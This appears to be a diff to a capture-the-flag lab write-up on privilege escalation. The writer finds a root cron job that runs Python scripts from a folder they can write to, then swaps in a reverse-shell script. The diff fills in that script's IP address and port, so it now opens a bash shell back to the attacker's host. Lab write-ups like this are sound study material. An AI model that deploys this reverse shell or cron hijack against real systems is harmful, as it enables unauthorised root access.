@@ -107,19 +107,21 @@ test.txt is owned by root and we can modify the test.py. Let’s cat the content
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034906.png)
 
 
-Which means this python script (which is owned by scriptmanager) opens test.txt and wrtites “testing 123!” on it.
+###### Which means this python script (which is owned by scriptmanager) opens test.txt and wrtites “testing 123!” on it.
 
-I used the process monitoring tool pspy64 to check if any cron jobs executed by the root user were interacting with the scripts folder. Fortunately, I discovered that the root user accesses this folder every minute and executes all .py files inside it with root privileges. You can verify this by the UID=0 shown in the screenshot, which is assigned to the root user. This explains why the scriptmanager user is able to modify a file owned by root.
+I used the process monitoring tool pspy64 to check if any cron jobs executed by the root user were interacting with the scripts folder. 
+Fortunately, I discovered that the root user accesses this folder every minute and executes all .py files inside it with root privileges. You can verify this by the UID=0 shown in the screenshot, which is assigned to the root user. 
+This explains why the scriptmanager user is able to modify a file owned by root.
 
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034919.png)
 
 
-Then modify the test.py to reverse shell with root privileges :
+##### Then modify the test.py to reverse shell with root privileges :
 
 ```
 import socket,os,pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.1, 4445)) # METS TON IP ICI
+s.connect(("10.10.14.22", 4445)) 
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
@@ -128,8 +130,6 @@ pty.spawn("/bin/bash")
 
 
 
-
-![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034223.png)
-
+##### Then wait a little and BOOM !
 
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034227.png)
